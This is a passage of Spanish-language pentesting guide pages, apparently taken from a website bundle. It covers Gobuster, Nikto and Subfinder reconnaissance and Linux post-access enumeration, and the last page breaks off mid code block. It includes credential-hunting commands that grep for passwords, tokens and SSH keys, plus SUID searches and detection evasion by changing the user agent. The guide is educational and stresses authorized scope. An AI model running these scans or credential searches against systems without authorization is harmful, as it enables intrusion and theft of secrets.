Aquí es donde entra en juego el **Fuzzing**, una técnica que utiliza herramientas automatizadas para descubrir directorios, archivos y subdominios desconocidos en una web. Esto se hace proporcionando un diccionario con palabras clave, que la herramienta utilizará para realizar pruebas sistemáticas y reportar cualquier coincidencia.

En esta guía, exploraremos **Gobuster**, una de las herramientas más potentes para el fuzzing web.

### Gobuster - Enumeración y Fuzzing Web

**Gobuster** es una herramienta de línea de comandos diseñada para descubrir directorios, subdominios y hosts virtuales en servidores web. Es rápida, eficiente y se utiliza ampliamente en pruebas de penetración.

#### Modos Principales de Gobuster

| **Modo**  | **Descripción**                                          |
| --------- | -------------------------------------------------------- |
| **dir**   | Enumeración de directorios y archivos.                   |
| **dns**   | Descubrimiento de subdominios a través de consultas DNS. |
| **vhost** | Enumeración de hosts virtuales en servidores web.        |

***

### Parámetros Clave en Gobuster

| **Flag**           | **Descripción**                                                 |
| ------------------ | --------------------------------------------------------------- |
| \`-u\`               | URL objetivo.                                                   |
| \`-w\`               | Ruta del diccionario a utilizar.                                |
| \`-t\`               | Número de hilos en paralelo para agilizar el escaneo.           |
| \`-x\`               | Extensiones a buscar (Ejemplo: php, txt, html).                 |
| \`-s\`               | Filtrar por códigos de estado positivos.                        |
| \`-k\`               | Omitir la verificación SSL.                                     |
| \`-b\`               | Ocultar códigos de estado específicos (Ejemplo: 404, 403, 301). |
| \`--exclude-length\` | Excluir respuestas según su tamaño.                             |
| \`-o\`               | Exportar los resultados a un archivo.                           |

***

### Wordlists Recomendados

Para obtener mejores resultados, se recomienda utilizar wordlists optimizadas para fuzzing web.

### Directorios y Archivos

* \`/usr/share/wordlists/dirb/common.txt\`
* \`/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\`

### Subdominios

* \`/usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt\`

***

### Ejemplos de Uso

#### Modo \`dir\` (Enumeración de Directorios y Archivos)

\`\`\`bash
gobuster dir -u <url> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t <hilos>
\`\`\`

#### Modo \`dns\` (Búsqueda de Subdominios)

\`\`\`bash
gobuster dns -d <url> -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
\`\`\`

#### Modo \`vhost\` (Descubrimiento de Virtual Hosts)

\`\`\`bash
gobuster vhost -u <url> -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 20
\`\`\`

***

### Consejos para una Auditoría Eficiente

 **Utiliza múltiples diccionarios** para mejorar la tasa de detección.\\
 **Excluye códigos de estado irrelevantes** (\`-b 404,403,301\`) para limpiar los resultados.
`,Jr=`## ![](</pentesting/assets/dalle-2025-02-22-08-21-05-a-high-tech-cybersecurity-themed-image-featuring-the-nikto-tool-the-image-showcases-a-hacker-style-computer-screen-with-lines-of-code-scanning-for-vu.webp>)

## Nikto - Escaneo de Vulnerabilidades Web

Nikto es una herramienta diseñada específicamente para este propósito: escanear servidores web en busca de vulnerabilidades conocidas, configuraciones incorrectas y archivos peligrosos. En esta guía, aprenderemos a utilizar Nikto de manera efectiva para auditar la seguridad de un servidor web.

### Nikto - Introducción y Modos de Uso:

Nikto es un escáner de vulnerabilidades de servidores web que realiza pruebas rápidas y automatizadas. A diferencia de herramientas como Burp Suite o Nessus, Nikto se especializa en detectar configuraciones incorrectas, versiones desactualizadas de software y archivos públicamente accesibles.

### Características Clave de Nikto

| Opción      | Descripción                                                        |
| ----------- | ------------------------------------------------------------------ |
| Target Host | URL o IP del servidor a analizar.                                  |
| Port        | Puerto en el que escucha el servidor (por defecto, 80 o 443).      |
| SSL/TLS     | Habilita el escaneo sobre HTTPS.                                   |
| User-Agent  | Personaliza la cabecera del agente de usuario.                     |
| Output      | Guarda los resultados en un archivo.                               |
| Timeout     | Define un límite de tiempo para cada solicitud.                    |
| Throttling  | Controla la velocidad de las peticiones para evitar ser bloqueado. |

### Diccionarios y Firmas Utilizadas

Nikto utiliza una base de datos con miles de pruebas para detectar vulnerabilidades comunes. Algunas de las firmas que emplea incluyen:

* Detectar versiones de software desactualizadas (Apache, Nginx, IIS, etc.).
* Identificar archivos de configuración expuestos (robots.txt, .htaccess, phpinfo.php).
* Analizar cabeceras HTTP en busca de configuraciones inseguras.

### ¿Cómo utilizar Nikto?

\`\`\`bash
nikto -h <url> # Escaneo simple con Nikto.
nikto -h <url> -p 443 # Si el servidor usa un puerto diferente al 80 o queremos analizar HTTPS:
nikto -h <url> -useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" # Evitar la Detección Modificando el User-Agent
nikto -h <url> -tuning -<número> # Excluir Ciertos Tipos de Pruebas, (-2=evita pruebas de archivos peligrosos.) (-4=evita pruebas de inyección SQL.) (-6=evita pruebas de XSS.)
nikto -h <url> -delay 2 # Controlar la Velocidad del Escaneo
\`\`\`
`,Yr=`Guía práctica de **Subfinder** para el descubrimiento de subdominios, orientada a pentesting externo, bug bounty y auditorías autorizadas. La idea central: no "lanzar y copiar la lista", sino **definir el alcance → recolectar subdominios de forma pasiva → resolver cuáles están vivos → identificar servicios web → priorizar → enumerar cada objetivo**.

> Flags verificadas contra \`subfinder -h\` de la versión **v2.11.0** del proyecto \`projectdiscovery/subfinder\`. Si usas otra versión, compruébalas con \`subfinder -h\`.

***

## ¿Qué es Subfinder?

Subfinder es una herramienta de **enumeración pasiva de subdominios**: no hace fuerza bruta contra el DNS del objetivo, sino que **consulta fuentes públicas** (certificados TLS, archivos históricos, motores de búsqueda, bases de datos DNS pasivas…) y agrega los resultados.

\`\`\`text
example.com
   ├── crt.sh            → dev.example.com · vpn.example.com
   ├── Wayback Archive   → old.example.com
   ├── HackerTarget      → mail.example.com
   ├── VirusTotal *      → staging.example.com
   └── SecurityTrails *  → api.example.com · jenkins.example.com
                 ↓
       Lista única de subdominios
\`\`\`

\`*\` = fuente que necesita API key.

Su fuerte frente a otras herramientas: **velocidad, salida limpia para pipelines** e integración con el resto del ecosistema de ProjectDiscovery (\`dnsx\`, \`httpx\`, \`nuclei\`).

***

## ¿Cuándo utilizarlo?

Al principio de un pentest **externo** o de bug bounty, cuando el alcance es un dominio (o un wildcard como \`*.example.com\`):

\`\`\`text
Alcance: *.example.com
   ↓
Subfinder (pasivo) → subdominios
   ↓
dnsx / -active → ¿cuáles resuelven?
   ↓
httpx → ¿cuáles sirven web?
   ↓
Feroxbuster / ffuf / Nikto sobre cada objetivo
\`\`\`

> **En OSCP y labs sin Internet** Subfinder apenas sirve: las fuentes pasivas no conocen dominios internos como \`box.htb\` o \`corp.local\`. Ahí usa **fuzzing de vhosts** con [ffuf](/pentesting/enumeration/ffuf-fuzzing-web) o [Gobuster](/pentesting/enumeration/gobuster-fuzzing-web), y transferencias de zona (\`dig axfr\`).

***

## Instalación

En Kali Linux:

\`\`\`bash
sudo apt install subfinder
\`\`\`

Con Go (última versión):

\`\`\`bash
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
\`\`\`

Comprobar instalación, versión y actualizar:

\`\`\`bash
subfinder -version
subfinder -up        # Actualiza a la última versión
\`\`\`

***

## Primer escaneo

\`\`\`bash
subfinder -d example.com
\`\`\`

Solo los subdominios, sin banner (lo que usarás casi siempre):

\`\`\`bash
subfinder -d example.com -silent
\`\`\`

***

## Entender el resultado

La salida es **un subdominio por línea**:

\`\`\`text
www.example.com
mail.example.com
dev.example.com
vpn.example.com
staging-api.example.com
\`\`\`

> Un subdominio en la lista **no significa que exista hoy**. Las fuentes pasivas guardan histórico: muchos ya no resuelven o apuntan a servicios dados de baja. Por eso el siguiente paso siempre es **resolver y comprobar**.

Con \`-v\` verás de qué fuente sale cada resultado, útil para valorar su fiabilidad:

\`\`\`bash
subfinder -d example.com -v
\`\`\`

***

## Fuentes (sources)

Listar todas las fuentes disponibles (en v2.11.0 son 48):

\`\`\`bash
subfinder -ls
\`\`\`

\`\`\`bash
subfinder -d example.com -s crtsh,hackertarget,waybackarchive   # Solo estas fuentes
subfinder -d example.com -es alienvault,zoomeyeapi              # Excluir fuentes
subfinder -d example.com -all                                   # Todas (más lento, más resultados)
subfinder -d example.com -recursive                             # Solo fuentes que admiten recursión
\`\`\`

| Flag | Función |
|---|---|
| \`-s\` / \`-sources\` | Usar solo las fuentes indicadas |
| \`-es\` / \`-exclude-sources\` | Excluir fuentes |
| \`-all\` | Usar todas las fuentes |
| \`-recursive\` | Solo fuentes capaces de enumerar subdominios de subdominios |
| \`-ls\` / \`-list-sources\` | Listar fuentes disponibles |
| \`-stats\` | Estadísticas por fuente al terminar |

Fuentes que funcionan **sin API key**: \`crtsh\`, \`hackertarget\`, \`waybackarchive\`, \`rapiddns\`, \`anubis\`, \`commoncrawl\`, \`digitorus\`, \`sitedossier\`, \`threatcrowd\`, \`hudsonrock\`.

***

## API keys: la diferencia real

Sin claves, Subfinder funciona, pero **las mejores fuentes necesitan API key** (VirusTotal, SecurityTrails, Censys, Shodan, Chaos, GitHub…). La diferencia en resultados puede ser enorme.

Las claves van en \`provider-config.yaml\`:

\`\`\`text
Linux  → ~/.config/subfinder/provider-config.yaml
macOS  → ~/Library/Application Support/subfinder/provider-config.yaml
\`\`\`

Formato:

\`\`\`yaml
virustotal:
  - TU_API_KEY
securitytrails:
  - TU_API_KEY
shodan:
  - TU_API_KEY
censys:
  - API_ID:API_SECRET
github:
  - ghp_TOKEN_1
  - ghp_TOKEN_2     # Varias claves → se rotan para evitar el rate limit
\`\`\`

Usar un archivo de configuración distinto:

\`\`\`bash
subfinder -d example.com -pc ./provider-config.yaml
\`\`\`

> **Nunca subas este archivo a un repositorio** ni lo pegues en un informe: contiene tus credenciales.

***

## Varios dominios

\`\`\`bash
subfinder -dL dominios.txt -silent                     # Lista de dominios
subfinder -dL dominios.txt -oD resultados/             # Un archivo por dominio
cat dominios.txt | subfinder -silent                   # Por STDIN
\`\`\`

| Flag | Función |
|---|---|
| \`-d\` / \`-domain\` | Dominio(s) objetivo |
| \`-dL\` / \`-list\` | Archivo con lista de dominios |
| \`-oD\` / \`-output-dir\` | Directorio de salida (solo con \`-dL\`) |

***

## Resolución: quedarse solo con lo vivo

Con \`-active\` (\`-nW\`) Subfinder resuelve cada subdominio y **descarta los que no responden**:

\`\`\`bash
subfinder -d example.com -active -silent
subfinder -d example.com -active -oI -silent        # Incluye la IP (-ip)
subfinder -d example.com -active -r 1.1.1.1,8.8.8.8 # Resolvers propios
subfinder -d example.com -active -rL resolvers.txt  # Resolvers desde archivo
subfinder -d example.com -active -t 20              # Hilos de resolución
\`\`\`

\`\`\`text
www.example.com,93.184.215.14
dev.example.com,10.20.0.5      ← IP privada en DNS público: posible fuga de info interna
\`\`\`

| Flag | Función |
|---|---|
| \`-nW\` / \`-active\` | Mostrar solo subdominios que resuelven |
| \`-oI\` / \`-ip\` | Añadir la IP a la salida (requiere \`-active\`) |
| \`-r\` / \`-rL\` | Resolvers a usar |
| \`-t\` | Hilos de resolución (por defecto 10, solo con \`-active\`) |
| \`-ei\` / \`-exclude-ip\` | Excluir IPs de la lista de dominios |

> Con \`-active\` ya **no es 100 % pasivo**: haces consultas DNS (aunque a resolvers públicos, no al servidor web del objetivo).

***

## Filtrado de resultados

\`\`\`bash
subfinder -d example.com -m api,dev,staging     # Mostrar solo coincidencias
subfinder -d example.com -f www,mail            # Excluir coincidencias
subfinder -d example.com -f fuera-de-alcance.txt
\`\`\`

| Flag | Función |
|---|---|
| \`-m\` / \`-match\` | Solo subdominios que coincidan (lista o archivo) |
| \`-f\` / \`-filter\` | Excluir subdominios que coincidan (lista o archivo) |

> Usa \`-f\` con un archivo de **subdominios fuera de alcance** para no tocarlos por error en las fases siguientes.

***

## Rendimiento: rate limit y timeouts

\`\`\`bash
subfinder -d example.com -rl 50                       # Máx. peticiones/s (global)
subfinder -d example.com -rls "hackertarget=10/m"     # Límite por fuente
subfinder -d example.com -timeout 60                  # Timeout por fuente (por defecto 30s)
subfinder -d example.com -max-time 20                 # Tiempo total máx. en minutos (por defecto 10)
\`\`\`

¿Por qué ajustarlo? Las fuentes gratuitas tienen límites de uso: si te pasas, **te bloquean temporalmente y pierdes resultados** sin darte cuenta.

***

## Salida y modos

\`\`\`bash
subfinder -d example.com -o subs.txt                  # Guardar resultados
subfinder -d example.com -oJ -o subs.json             # Formato JSONL
subfinder -d example.com -oJ -cs -o subs.json         # JSONL + todas las fuentes de cada subdominio
subfinder -d example.com -silent -nc                  # Sin banner ni colores
\`\`\`

Ejemplo de línea JSONL:

\`\`\`json
{"host":"dev.example.com","input":"example.com","source":"crtsh"}
\`\`\`

Guardar la salida es clave para organizar la enumeración:

\`\`\`text
recon/
├── subfinder/
│   ├── subs.txt
│   ├── subs-vivos.txt
│   └── web.txt
├── nmap/
└── notes.md
\`\`\`

***

## Proxy

\`\`\`bash
subfinder -d example.com -proxy http://127.0.0.1:8080
\`\`\`

Útil para registrar el tráfico o salir por un proxy concreto. Ten en cuenta que estas peticiones van a las **fuentes**, no al objetivo.

***

## Pipelines: Subfinder + dnsx + httpx

Subfinder brilla cuando se encadena con otras herramientas:

\`\`\`bash
# Subdominios → resolver con dnsx → ver respuesta A
subfinder -d example.com -silent | dnsx -silent -a -resp

# Subdominios → servicios web vivos con status, título y tecnología
subfinder -d example.com -silent | httpx -silent -sc -title -td

# Guardar solo los que sirven web
subfinder -d example.com -silent | httpx -silent -o web.txt
\`\`\`

> **En Kali**, el \`httpx\` de ProjectDiscovery se instala como **\`httpx-toolkit\`** (\`sudo apt install httpx-toolkit\`) para no chocar con la librería Python \`httpx\`.

\`\`\`text
subfinder → 300 subdominios
   ↓ dnsx / -active
120 resuelven
   ↓ httpx
45 sirven HTTP/HTTPS
   ↓
Priorizar y enumerar cada uno
\`\`\`

***

## Qué hacer ante cada hallazgo

No pases de largo. El nombre del subdominio ya te dice mucho.

### Entornos de desarrollo

\`\`\`text
dev. · staging. · test. · uat. · pre. · beta.
\`\`\`

Suelen tener **menos seguridad**: debug activo, credenciales por defecto, versiones antiguas. Prioridad alta.

### Paneles y herramientas internas

\`\`\`text
admin. · jenkins. · gitlab. · grafana. · kibana. · jira. · vpn. · sso.
\`\`\`

Identifica la tecnología y busca la página correspondiente: [Jenkins](/pentesting/web/jenkins), [Tomcat](/pentesting/web/tomcat)… y prueba credenciales por defecto si está en alcance.

### APIs

\`\`\`text
api. · api-v2. · graphql. · gateway.
\`\`\`

Enumera endpoints con [Feroxbuster](/pentesting/enumeration/feroxbuster) o [ffuf](/pentesting/enumeration/ffuf-fuzzing-web) y busca documentación expuesta (\`/swagger\`, \`/openapi.json\`, \`/graphql\`).

### CNAME a servicios de terceros

\`\`\`bash
dig CNAME old.example.com
\`\`\`

Si apunta a un servicio dado de baja (S3, GitHub Pages, Heroku, Azure…) que devuelve error, puede ser vulnerable a **subdomain takeover**. Verifícalo con cuidado y solo si está en alcance.

### IP privada en DNS público

Revela **direccionamiento interno**. Documéntalo: es información útil si consigues acceso a la red interna.

***

## Comprobaciones manuales que no debes saltarte

Subfinder no sustituye a otras técnicas de descubrimiento:

\`\`\`bash
dig axfr @ns1.example.com example.com          # Transferencia de zona
curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq -r '.[].name_value' | sort -u
\`\`\`

Y si tienes un servidor web pero los subdominios no aparecen en fuentes públicas, **fuzzing de vhosts**:

\`\`\`bash
ffuf -u http://<ip> -H "Host: FUZZ.example.com" \\
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <size>
\`\`\`

***

## Flujo de trabajo (pentest externo / bug bounty)

\`\`\`text
Alcance confirmado (dominios / wildcards)
   ↓
Subfinder pasivo (con API keys)
   ↓
Filtrar fuera de alcance (-f)
   ↓
Resolver (-active / dnsx)
   ↓
Servicios web (httpx)
   ↓
¿Resultados?
   ├── Pocos → -all · más API keys · crt.sh manual · fuzzing de vhosts
   └── Muchos → priorizar: dev/staging · paneles · APIs · CNAME externos
                ↓
         Nmap sobre las IPs del alcance
                ↓
         Feroxbuster / ffuf / Nikto por subdominio
                ↓
         Siguiente fase del pentest
\`\`\`

***

## Árbol de decisión

\`\`\`text
¿El alcance es un dominio público?
   ├─ No (lab interno / .htb / .local) → fuzzing de vhosts + AXFR, no Subfinder
   └─ Sí → subfinder -d <dominio> -silent
             │
             ├─ ¿Pocos resultados? → -all · API keys · -recursive
             ├─ ¿Resultados obsoletos? → -active / dnsx
             ├─ ¿Fuera de alcance? → -f lista.txt
             └─ ¿Vivos? → httpx → priorizar → enumerar cada objetivo
\`\`\`

***

## "Encontré X → ¿qué hago?"

| Hallazgo | Siguiente paso |
|---|---|
| \`dev.\` / \`staging.\` / \`test.\` | Prioridad alta: enumerar web y buscar debug/credenciales |
| \`admin.\` / \`panel.\` | Identificar tecnología, probar credenciales por defecto |
| \`jenkins.\` / \`gitlab.\` / \`grafana.\` | Buscar versión y vulnerabilidades conocidas |
| \`api.\` / \`graphql.\` | Enumerar endpoints y documentación expuesta |
| \`vpn.\` / \`sso.\` / \`remote.\` | Identificar producto y versión |
| \`mail.\` / \`smtp.\` | Enumerar [SMTP](/pentesting/services/puerto-25-smtp) |
| CNAME a servicio externo con error | Evaluar subdomain takeover |
| IP privada en DNS público | Documentar direccionamiento interno |
| No resuelve | Histórico: descartar o revisar Wayback |
| Muchos resultados | Filtrar con \`-m\` / \`-f\` y priorizar |
| Pocos resultados | \`-all\`, API keys, crt.sh manual, vhosts |

***

## Referencia rápida de comandos

| Objetivo | Comando |
|---|---|
| Scan básico | \`subfinder -d example.com\` |
| Solo resultados | \`subfinder -d example.com -silent\` |
| Lista de dominios | \`subfinder -dL dominios.txt\` |
| Todas las fuentes | \`subfinder -d example.com -all\` |
| Fuentes concretas | \`subfinder -d example.com -s crtsh,hackertarget\` |
| Excluir fuentes | \`subfinder -d example.com -es alienvault\` |
| Listar fuentes | \`subfinder -ls\` |
| Solo vivos | \`subfinder -d example.com -active\` |
| Vivos + IP | \`subfinder -d example.com -active -oI\` |
| Filtrar | \`subfinder -d example.com -f www,mail\` |
| Coincidir | \`subfinder -d example.com -m api,dev\` |
| Rate limit | \`subfinder -d example.com -rl 50\` |
| Guardar | \`subfinder -d example.com -o subs.txt\` |
| JSONL | \`subfinder -d example.com -oJ -o subs.json\` |
| Un archivo por dominio | \`subfinder -dL dominios.txt -oD out/\` |
| API keys propias | \`subfinder -d example.com -pc provider-config.yaml\` |
| Proxy | \`subfinder -d example.com -proxy http://127.0.0.1:8080\` |
| Estadísticas | \`subfinder -d example.com -stats\` |
| Actualizar | \`subfinder -up\` |

### Para memorizar

\`\`\`bash
# 1. Scan básico limpio
subfinder -d example.com -silent

# 2. Máxima cobertura
subfinder -d example.com -all -silent -o subs.txt

# 3. Solo los que resuelven, con IP
subfinder -d example.com -active -oI -silent

# 4. Pipeline a servicios web
subfinder -d example.com -silent | httpx -silent -sc -title -td

# 5. Varios dominios, un archivo por dominio
subfinder -dL dominios.txt -oD resultados/
\`\`\`

***

## Subfinder vs Amass vs ffuf vs Gobuster

| Herramienta | Punto fuerte |
|---|---|
| **Subfinder** | Pasivo, rápido, salida limpia para pipelines |
| **Amass** | Enumeración más profunda (pasiva + activa), más lento |
| **ffuf** | Fuzzing de vhosts/subdominios con wordlist (activo) |
| **Gobuster** | Modos \`dns\` y \`vhost\` sencillos (activo) |

> Pasivo y activo se **complementan**: Subfinder encuentra lo que está en fuentes públicas; el fuzzing encuentra lo que nunca se publicó.

***

## Checklist

### Preparación
- [ ] Alcance confirmado por escrito (dominios / wildcards)
- [ ] Lista de subdominios fuera de alcance
- [ ] API keys configuradas en \`provider-config.yaml\`
- [ ] Subfinder actualizado (\`-up\`)

### Recolección
- [ ] Scan básico
- [ ] Scan con \`-all\`
- [ ] Revisar \`-stats\` (¿alguna fuente falla o está limitada?)
- [ ] crt.sh manual
- [ ] Transferencia de zona (AXFR)

### Validación
- [ ] Resolver (\`-active\` / \`dnsx\`)
- [ ] Filtrar fuera de alcance (\`-f\`)
- [ ] Servicios web (\`httpx\`)
- [ ] Revisar CNAME a servicios externos

### Priorización
- [ ] Entornos dev / staging / test
- [ ] Paneles de administración y herramientas internas
- [ ] APIs
- [ ] IPs privadas expuestas

### Resultados
- [ ] Guardar output (txt / JSONL)
- [ ] Documentar subdominios vivos y su tecnología
- [ ] Pasar objetivos a Nmap / Feroxbuster / ffuf / Nikto

***

## La idea que debes recordar

Subfinder no ataca nada: **convierte un dominio en un mapa de superficie de ataque**.

\`\`\`text
DOMINIO → Subfinder
   ├── Desarrollo  → dev · staging · test
   ├── Paneles     → admin · jenkins · grafana
   └── Servicios   → api · vpn · mail
                 ↓
         Resolver + httpx
                 ↓
         Objetivos priorizados
                 ↓
         Siguiente fase del pentest
\`\`\`

> **Regla mental:** confirmar alcance → Subfinder pasivo con API keys → filtrar fuera de alcance → resolver → identificar servicios web → priorizar dev/paneles/APIs → enumerar cada objetivo → correlacionar hallazgos.

***

**Fuentes:** repositorio oficial \`projectdiscovery/subfinder\` y salida de \`subfinder -h\` / \`subfinder -ls\` en v2.11.0 (verificación de flags: \`-active\`, \`-oI\`, \`-all\`, \`-recursive\`, \`-rls\`, \`-oD\`, \`-cs\`, \`-pc\`).
`,Xr=`> **Linux Pentesting Field Guide.** Qué hacer cuando ya tienes una shell en un Linux: enumeración, *situational awareness*, *credential hunting* y preparación de la escalada de privilegios, con comandos explicados y orientados a decisión.

Guía de consulta rápida para responder a *"tengo una shell Linux, ¿qué hago ahora?"*. Cada comando se explica por **qué hace → cómo se usa → qué buscar en la salida → qué hacer después**, no como una lista suelta.

Organizada en páginas para no saturar:

* **Introducción y Quick Reference** — el cheat sheet, el flujo de enumeración y la tabla "encuentro X → hago Y".
* **Información del sistema** — kernel, distribución, hardware, \`/proc\`, memoria, disco y montajes.
* **Archivos, búsqueda y permisos** — \`ls\`, \`find\`, *credential hunting*, compresión, permisos, SUID/SGID y atributos.
* **Red y Samba** — interfaces, rutas, DNS, conexiones, captura y comandos Linux para SMB.
* **Procesos, texto y shell** — procesos/monitorización, \`grep\`/\`sed\`/\`awk\`, logs, pipes/redirecciones y transferencia.

La escalada de privilegios en profundidad vive en [Escalada de Privilegios → Linux](/pentesting/privilege-escalation/linux); aquí se cubre la **enumeración** que la alimenta.
`,Zr=`El sistema de ficheros es donde viven las credenciales, las configuraciones y los vectores de escalada. Esta página cubre la navegación básica, la búsqueda con \`find\`, el *credential hunting*, la compresión y —muy importante para PrivEsc— los **permisos**, **SUID/SGID/Sticky Bit** y los **atributos**.

***

## Navegación y gestión de archivos

Comandos base (referencia). Los que **modifican/eliminan** se marcan como destructivos.

\`\`\`bash
pwd                # Directorio actual
ls                 # Listar
cd <ruta>          # Cambiar de directorio
file <archivo>     # Identificar el tipo real de un archivo
touch <archivo>    # Crear archivo vacío / actualizar timestamp
cp <orig> <dest>   # Copiar
mv <orig> <dest>   # Mover/renombrar
ln -s <obj> <enl>  # Crear enlace simbólico
mkdir <dir>        # Crear directorio
\`\`\`

> **Peligro — destructivo.** \`rm <archivo>\`, \`rm -rf <dir>\` (borrado recursivo sin confirmación) y \`mv\` sobre un destino existente **destruyen datos**. En una máquina ajena, no borres ni sobrescribas salvo que el alcance lo permita.

* **\`file\`** es útil para saber qué es realmente un archivo sin extensión (binario ELF, script, imagen, archivo comprimido…).

***

## ls -la

**Fundamental.** Es el comando de enumeración de archivos por excelencia.

\`\`\`bash
ls -la      # Incluye ocultos, permisos, propietario, grupo, tamaño, fecha
ls -lah     # Igual, con tamaños legibles
ls -la /home /tmp /opt /var/www 2>/dev/null
\`\`\`

Revela de un vistazo:

* **Archivos ocultos** (empiezan por \`.\`): \`.bash_history\`, \`.ssh\`, \`.config\`, \`.env\`…
* **Permisos**, **propietario** y **grupo** de cada archivo.
* **Timestamps** (archivos modificados recientemente suelen ser interesantes).

* **Qué buscar**: \`.ssh/\`, \`.bash_history\`, \`.env\`, \`config.*\`, scripts con permisos amplios, archivos propiedad de root escribibles por tu usuario.
* **Siguiente paso**: revisa los ocultos y pasa a \`find\` para barrer todo el sistema.

***

## find

**Fundamental para PrivEsc y credential hunting.** Busca en el sistema de ficheros por nombre, propietario, tiempo, tipo y permisos.

### Buscar por nombre

\`\`\`bash
find / -name "config.php" 2>/dev/null
find / -name "*.bin" 2>/dev/null
find /home -name "id_rsa" 2>/dev/null
\`\`\`

### Buscar por propietario

\`\`\`bash
find / -user <usuario> 2>/dev/null
find / -group <grupo> 2>/dev/null
\`\`\`

### Buscar por tiempo

\`\`\`bash
find / -type f -mtime -7 2>/dev/null     # Modificados en los últimos 7 días
find /usr/bin -type f -mtime -10         # (del cheatsheet) modificados hace <10 días
find /usr/bin -type f -atime +100        # (del cheatsheet) no accedidos en >100 días
\`\`\`

### Buscar binarios SUID / SGID

\`\`\`bash
find / -perm -u=s -type f 2>/dev/null     # SUID (forma del cheatsheet)
find / -perm -4000 -type f 2>/dev/null    # SUID (equivalente octal) — (adicional)
find / -perm -g=s -type f 2>/dev/null     # SGID
find / -perm -2000 -type f 2>/dev/null    # SGID (octal) — (adicional)
\`\`\`

* **Qué buscar**: binarios SUID **fuera de lo normal** (no los típicos \`passwd\`, \`sudo\`, \`mount\`). Un SUID inusual o una versión vulnerable es un vector de escalada.
* **Por qué es útil**: SUID/SGID permiten ejecutar con los privilegios del **propietario/grupo** del binario; es uno de los vectores clásicos de *Linux Privilege Escalation*.
* **Siguiente paso**: para cada SUID interesante, identifica binario y versión y contrástalo (p. ej. GTFOBins) desde [Escalada de Privilegios → Linux](/pentesting/privilege-escalation/linux).

> **Nota.** \`find / -xdev\` limita la búsqueda al sistema de ficheros actual (no cruza a otros montajes) — útil para no perderte en shares de red. \`2>/dev/null\` descarta los *permission denied*.

> **Peligro — destructivo.** \`find\` admite \`-delete\` y \`-exec rm {} \\;\`. Con el patrón equivocado puedes **borrar medio sistema**. En enumeración no uses acciones destructivas.

***

## Credential hunting

Buscar secretos en archivos es una de las fases más rentables. Usa \`find\` + \`grep\` (detalle de \`grep\` en [Procesos, texto y shell](/pentesting/linux/procesos-texto-shell)).

Extensiones interesantes:

\`\`\`text
*.conf  *.config  *.ini  *.env
*.bak   *.backup  *.old
*.txt   *.log
*.db    *.sqlite
*.key   *.pem     *.ppk
*.sh    *.py
\`\`\`

Búsquedas típicas (todo esto es enumeración **adicional** estándar de pentest):

\`\`\`bash
# Archivos de configuración y backups por el sistema
find / \\( -name "*.conf" -o -name "*.bak" -o -name "*.env" \\) 2>/dev/null

# Palabras sensibles dentro de archivos
grep -Rni "password" /etc /var/www /opt 2>/dev/null
grep -Rni -e "pass" -e "secret" -e "api_key" -e "token" /var/www 2>/dev/null

# Claves SSH y configuración
ls -la ~/.ssh /home/*/.ssh /root/.ssh 2>/dev/null
find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null

# Historial de comandos (a veces con contraseñas)
cat ~/.bash_history 2>/dev/null
find /home -name ".*_history" 2>/dev/null
\`\`\`

Qué información priorizar: **contraseñas, tokens, API keys, claves privadas, connection strings, configuraciones, backups, historiales y scripts**.

* **Siguiente paso**: toda credencial se prueba como **reutilización** (SSH, servicios, otros usuarios) **solo** dentro del alcance autorizado.

***

## Compresión y extracción

Útil para abrir backups encontrados y para empaquetar/transferir (de forma autorizada).

\`\`\`bash
# tar
tar -xvf archivo.tar              # Extraer
tar -tf archivo.tar               # Listar contenido SIN extraer
tar -xvf archivo.tar -C /tmp      # Extraer en otra ubicación
tar -czvf salida.tar.gz <dir>     # Crear .tar.gz

# gzip / bzip2
gunzip archivo.gz                 # Descomprimir .gz
bunzip2 archivo.bz2               # Descomprimir .bz2

# zip / 7z / rar
unzip archivo.zip
7za x archivo.7z
unrar x archivo.rar
\`\`\`

* **Qué buscar**: dentro de backups (\`.tar\`, \`.zip\`, \`.sql\`, \`.bak\`) suele haber **código fuente, credenciales y configuración**. Usa \`tar -tf\` / \`unzip -l\` para **inspeccionar antes de extraer**.
* **Siguiente paso**: extrae en \`/tmp\` (o en tu máquina) y aplica *credential hunting* sobre el contenido.

***

## Permisos Linux

**Fundamental.** Entender los permisos es clave para la escalada.

Lectura visual de \`ls -la\`:

\`\`\`text
-rwxr-xr-x
│├─┼─┼─┤
││ │ │ └── Otros:        r-x
││ │ └──── Grupo:        r-x
││ └────── Propietario:  rwx
│└──────── (resto de bits)
└───────── Tipo: - archivo · d directorio · l enlace · c/b dispositivo
\`\`\`

\`\`\`text
r = read (4)     w = write (2)     x = execute (1)
\`\`\`

Gestión de permisos y propiedad:

\`\`\`bash
chmod <modo> <archivo>    # Cambiar permisos (p. ej. chmod 640 archivo)
chown <user>:<grp> <arch> # Cambiar propietario/grupo
chgrp <grupo> <archivo>   # Cambiar grupo
\`\`\`

* **Qué buscar (enumeración)**: archivos/directorios **escribibles por tu usuario** que pertenezcan a otro usuario o a root (scripts ejecutados por cron/servicios, configs de servicios).

> **Peligro — destructivo.** \`chmod\`, \`chown\` y \`chgrp\` **cambian el estado del sistema**. Un \`chmod -R 777 /\` o un \`chown\` masivo pueden romper la máquina o abrir agujeros. Son comandos de **modificación**, no de enumeración: úsalos solo si el alcance lo justifica y sabes el efecto.

***

## SUID / SGID / Sticky Bit

Permisos especiales, muy relevantes para *Linux Privilege Escalation*.

| Bit | Símbolo | Efecto |
|---|---|---|
| **SUID** | \`s\` en el propietario (\`-rwsr-xr-x\`) | El binario se ejecuta con los privilegios de su **propietario** (a menudo root). |
| **SGID** | \`s\` en el grupo (\`-rwxr-sr-x\`) | Se ejecuta con los privilegios del **grupo**; en directorios, los archivos heredan el grupo. |
| **Sticky** | \`t\` en otros (\`drwxrwxrwt\`) | En directorios (p. ej. \`/tmp\`): solo el **propietario** de cada archivo puede borrarlo. |

Enumeración (lo importante aquí):

\`\`\`bash
